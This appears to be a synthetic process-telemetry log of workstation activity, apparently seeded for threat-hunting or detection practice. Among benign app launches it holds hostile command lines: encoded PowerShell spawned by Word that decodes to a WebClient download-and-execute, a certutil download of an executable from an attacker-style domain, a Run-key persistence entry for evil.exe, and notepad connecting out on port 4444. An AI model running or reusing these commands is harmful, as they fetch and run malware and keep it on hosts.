+2026-04-01 14:33:00,eng-ws-01,ethan,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,curl/7.68
+2026-04-01 14:34:00,ops-ws-02,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
+2026-04-01 14:34:00,eng-ws-01,ethan,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
+2026-04-01 14:35:00,hr-ws-01,irfan,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
+2026-04-01 14:35:00,eng-ws-01,ethan,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
+2026-04-01 14:36:00,fin-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
+2026-04-01 14:37:00,ops-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",52.95.110.1,443,outlook
+2026-04-01 14:38:00,fin-ws-01,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",151.101.1.69,443,outlook
+2026-04-01 14:39:00,fin-ws-02,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
+2026-04-01 14:40:00,hr-ws-01,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
+2026-04-01 14:41:00,sales-lt-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",172.16.4.25,0,none
+2026-04-01 14:42:00,shared-jump-01,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
+2026-04-01 14:43:00,fin-ws-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
+2026-04-01 14:44:00,sales-lt-01,alice,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
+2026-04-01 14:45:00,fin-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
+2026-04-01 14:46:00,sales-lt-01,diana,slack.exe,explorer.exe,slack.exe --processStart slack.exe,45.33.32.156,443,slack-client
+2026-04-01 14:47:00,hr-ws-01,helen,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 14:48:00,shared-jump-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-01 14:49:00,ops-ws-02,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
+2026-04-01 14:50:00,fin-ws-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",10.0.1.15,445,none
+2026-04-01 14:51:00,hr-ws-01,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",192.168.1.12,0,none
+2026-04-01 14:52:00,ops-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
+2026-04-01 14:53:00,hr-ws-01,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",10.0.1.15,445,none
+2026-04-01 14:54:00,hr-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
+2026-04-01 14:55:00,ops-ws-02,bob,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
+2026-04-01 14:56:00,ops-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.5,0,none
+2026-04-01 14:57:00,ops-ws-02,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",45.33.32.156,443,outlook
+2026-04-01 14:58:00,ops-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",45.33.32.156,443,outlook
+2026-04-01 14:59:00,eng-ws-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
+2026-04-01 15:00:00,fin-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
+2026-04-01 15:01:00,fin-ws-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-01 15:02:00,eng-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
+2026-04-01 15:03:00,fin-ws-01,irfan,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
+2026-04-01 15:04:00,ops-ws-02,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",10.1.5.12,445,none
+2026-04-01 15:05:00,fin-ws-02,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
+2026-04-01 15:06:00,ops-ws-02,julia,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 15:07:00,eng-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 15:08:00,eng-ws-01,irfan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 15:09:00,fin-ws-01,ethan,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.5,0,none
+2026-04-01 15:10:00,shared-jump-01,farah,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
+2026-04-01 15:11:00,fin-ws-01,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
+2026-04-01 15:12:00,eng-ws-02,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
+2026-04-01 15:13:00,sales-lt-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
+2026-04-01 15:14:00,eng-ws-01,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",52.95.110.1,443,outlook
+2026-04-01 15:15:00,eng-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.0.0.10,445,none
+2026-04-01 15:16:00,ops-ws-01,diana,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.10,0,none
+2026-04-01 15:17:00,shared-jump-01,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 15:18:00,sales-lt-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.0.1.15,0,none
+2026-04-01 15:19:00,sales-lt-01,helen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\helen\Documents\notes.txt""",10.0.1.15,0,none
+2026-04-01 15:20:00,fin-ws-01,bob,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
+2026-04-01 15:21:00,eng-ws-01,ethan,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
+2026-04-01 15:22:00,fin-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",52.95.110.1,443,outlook
+2026-04-01 15:23:00,sales-lt-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,151.101.1.69,443,slack-client
+2026-04-01 15:24:00,hr-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.2.20,445,none
+2026-04-01 15:25:00,hr-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.0.0.5,445,none
+2026-04-01 15:26:00,ops-ws-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
+2026-04-01 15:27:00,ops-ws-02,helen,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
+2026-04-01 15:28:00,fin-ws-01,helen,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
+2026-04-01 15:29:00,ops-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
+2026-04-01 15:30:00,ops-ws-02,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 15:31:00,sales-lt-02,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",1.1.1.1,443,outlook
+2026-04-01 15:31:00,shared-jump-01,julia,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-01 15:32:00,eng-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.1.5.12,0,none
+2026-04-01 15:32:00,shared-jump-01,julia,evil.exe,explorer.exe,C:\Users\julia\AppData\Local\Temp\evil.exe,10.0.1.15,0,none
+2026-04-01 15:33:00,hr-ws-01,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
+2026-04-01 15:33:00,shared-jump-01,julia,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.10.8,0,none
+2026-04-01 15:34:00,fin-ws-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",151.101.1.69,443,outlook
+2026-04-01 15:35:00,eng-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
+2026-04-01 15:36:00,hr-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
+2026-04-01 15:37:00,sales-lt-02,charlie,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
+2026-04-01 15:38:00,sales-lt-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
+2026-04-01 15:39:00,ops-ws-01,farah,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.5,0,none
+2026-04-01 15:40:00,shared-jump-01,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",192.168.1.12,0,none
+2026-04-01 15:41:00,ops-ws-01,farah,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 15:42:00,shared-jump-01,charlie,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
+2026-04-01 15:43:00,ops-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.1.5.12,0,none
+2026-04-01 15:44:00,fin-ws-02,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
+2026-04-01 15:45:00,sales-lt-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,1.1.1.1,443,slack-client
+2026-04-01 15:46:00,hr-ws-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
+2026-04-01 15:47:00,fin-ws-02,julia,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
+2026-04-01 15:48:00,fin-ws-02,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
+2026-04-01 15:49:00,fin-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
+2026-04-01 15:50:00,ops-ws-01,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
+2026-04-01 15:51:00,hr-ws-01,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
+2026-04-01 15:52:00,sales-lt-02,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
+2026-04-01 15:53:00,fin-ws-02,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
+2026-04-01 15:54:00,shared-jump-01,farah,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
+2026-04-01 15:55:00,fin-ws-01,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
+2026-04-01 15:56:00,ops-ws-02,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
+2026-04-01 15:57:00,ops-ws-02,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
+2026-04-01 15:58:00,eng-ws-02,helen,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
+2026-04-01 15:59:00,ops-ws-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",192.168.10.9,445,none
+2026-04-01 16:00:00,shared-jump-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.0.1.15,445,none
+2026-04-01 16:01:00,ops-ws-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
+2026-04-01 16:02:00,fin-ws-01,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
+2026-04-01 16:02:00,shared-jump-01,bob,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-01 16:03:00,fin-ws-02,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
+2026-04-01 16:03:00,shared-jump-01,bob,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-01 16:04:00,eng-ws-02,ethan,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
+2026-04-01 16:05:00,hr-ws-01,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",10.1.5.12,0,none
+2026-04-01 16:06:00,shared-jump-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
+2026-04-01 16:07:00,fin-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,23.45.67.89,443,zoom-client
+2026-04-01 16:08:00,fin-ws-01,julia,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
+2026-04-01 16:09:00,shared-jump-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
+2026-04-01 16:10:00,shared-jump-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.2.20,0,none
+2026-04-01 16:11:00,shared-jump-01,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
+2026-04-01 16:12:00,sales-lt-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
+2026-04-01 16:13:00,sales-lt-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",172.16.10.8,445,none
+2026-04-01 16:14:00,hr-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
+2026-04-01 16:15:00,sales-lt-01,george,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
+2026-04-01 16:16:00,fin-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,23.45.67.89,443,zoom-client
+2026-04-01 16:17:00,ops-ws-01,farah,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
+2026-04-01 16:18:00,ops-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",172.16.4.25,445,none
+2026-04-01 16:19:00,sales-lt-02,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
+2026-04-01 16:20:00,sales-lt-01,bob,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
+2026-04-01 16:21:00,fin-ws-02,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 16:22:00,ops-ws-02,julia,explorer.exe,explorer.exe,explorer.exe /background,10.0.2.20,0,none
+2026-04-01 16:23:00,fin-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,104.18.20.12,443,zoom-client
+2026-04-01 16:24:00,fin-ws-02,charlie,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
+2026-04-01 16:25:00,sales-lt-01,helen,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
+2026-04-01 16:26:00,eng-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,192.168.10.9,0,none
+2026-04-01 16:27:00,sales-lt-01,diana,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 16:28:00,eng-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
+2026-04-01 16:29:00,shared-jump-01,helen,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
+2026-04-01 16:30:00,eng-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 16:31:00,hr-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",172.16.10.8,445,none
+2026-04-01 16:32:00,ops-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.5,0,none
+2026-04-01 16:33:00,shared-jump-01,irfan,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 16:34:00,sales-lt-02,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
+2026-04-01 16:35:00,sales-lt-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
+2026-04-01 16:36:00,fin-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
+2026-04-01 16:37:00,ops-ws-01,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",23.45.67.89,443,outlook
+2026-04-01 16:38:00,fin-ws-02,julia,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
+2026-04-01 16:39:00,sales-lt-02,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
+2026-04-01 16:40:00,ops-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,151.101.1.69,443,slack-client
+2026-04-01 16:41:00,fin-ws-01,julia,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
+2026-04-01 16:42:00,ops-ws-01,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",23.45.67.89,443,outlook
+2026-04-01 16:43:00,ops-ws-02,julia,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-01 16:44:00,shared-jump-01,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
+2026-04-01 16:45:00,sales-lt-02,helen,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-01 16:45:00,eng-ws-02,helen,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-01 16:46:00,sales-lt-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",104.18.20.12,443,outlook
+2026-04-01 16:46:00,eng-ws-02,helen,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
+2026-04-01 16:47:00,eng-ws-02,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
+2026-04-01 16:47:00,eng-ws-02,helen,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
+2026-04-01 16:48:00,eng-ws-01,julia,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-01 16:49:00,shared-jump-01,julia,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
+2026-04-01 16:50:00,shared-jump-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
+2026-04-01 16:51:00,shared-jump-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
+2026-04-01 16:52:00,shared-jump-01,bob,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
+2026-04-01 16:53:00,sales-lt-01,farah,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 16:54:00,ops-ws-02,diana,explorer.exe,explorer.exe,explorer.exe /background,192.168.10.9,0,none
+2026-04-01 16:55:00,shared-jump-01,helen,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
+2026-04-01 16:56:00,fin-ws-01,irfan,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
+2026-04-01 16:57:00,ops-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
+2026-04-01 16:58:00,ops-ws-01,charlie,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
+2026-04-01 16:59:00,ops-ws-01,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",52.95.110.1,443,outlook
+2026-04-01 17:00:00,shared-jump-01,helen,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
+2026-04-01 17:01:00,hr-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
+2026-04-01 17:02:00,hr-ws-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
+2026-04-01 17:03:00,sales-lt-01,farah,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
+2026-04-01 17:04:00,sales-lt-02,ethan,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
+2026-04-01 17:05:00,shared-jump-01,irfan,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
+2026-04-01 17:06:00,ops-ws-01,charlie,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
+2026-04-01 17:07:00,hr-ws-01,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",151.101.1.69,443,outlook
+2026-04-01 17:08:00,hr-ws-01,helen,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
+2026-04-01 17:09:00,sales-lt-02,ethan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
+2026-04-01 17:10:00,fin-ws-01,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 17:11:00,fin-ws-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",192.168.10.9,0,none
+2026-04-01 17:12:00,fin-ws-02,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
+2026-04-01 17:13:00,ops-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
+2026-04-01 17:14:00,sales-lt-02,charlie,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 17:15:00,sales-lt-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",10.1.5.12,445,none
+2026-04-01 17:16:00,ops-ws-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.0.5,0,none
+2026-04-01 17:17:00,eng-ws-02,julia,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
+2026-04-01 17:18:00,eng-ws-01,charlie,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 17:19:00,eng-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",192.168.1.12,445,none
+2026-04-01 17:20:00,fin-ws-01,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
+2026-04-01 17:21:00,shared-jump-01,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
+2026-04-01 17:22:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,151.101.1.69,443,slack-client
+2026-04-01 17:23:00,fin-ws-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-01 17:24:00,fin-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",23.45.67.89,443,outlook
+2026-04-01 17:25:00,sales-lt-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
+2026-04-01 17:26:00,eng-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.1.5.12,445,none
+2026-04-01 17:26:00,fin-ws-02,farah,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-01 17:27:00,shared-jump-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
+2026-04-01 17:27:00,fin-ws-02,farah,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-01 17:28:00,sales-lt-02,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
+2026-04-01 17:29:00,eng-ws-02,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
+2026-04-01 17:30:00,fin-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
+2026-04-01 17:31:00,fin-ws-02,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",10.1.5.12,445,none
+2026-04-01 17:32:00,ops-ws-01,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
+2026-04-01 17:33:00,hr-ws-01,farah,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
+2026-04-01 17:34:00,eng-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-01 17:35:00,fin-ws-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",192.168.10.9,0,none
+2026-04-01 17:36:00,hr-ws-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.1.5.12,0,none
+2026-04-01 17:37:00,ops-ws-01,julia,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
+2026-04-01 17:38:00,fin-ws-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
+2026-04-01 17:39:00,shared-jump-01,farah,explorer.exe,explorer.exe,explorer.exe /background,192.168.10.9,0,none
+2026-04-01 17:40:00,sales-lt-01,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.2.20,445,none
+2026-04-01 17:41:00,fin-ws-02,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",10.0.0.10,445,none
+2026-04-01 17:42:00,sales-lt-02,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
+2026-04-01 17:43:00,eng-ws-02,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
+2026-04-01 17:44:00,sales-lt-02,diana,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 17:45:00,fin-ws-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",185.199.108.153,443,outlook
+2026-04-01 17:46:00,sales-lt-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.2.20,0,none
+2026-04-01 17:47:00,shared-jump-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
+2026-04-01 17:48:00,eng-ws-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
+2026-04-01 17:49:00,sales-lt-01,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
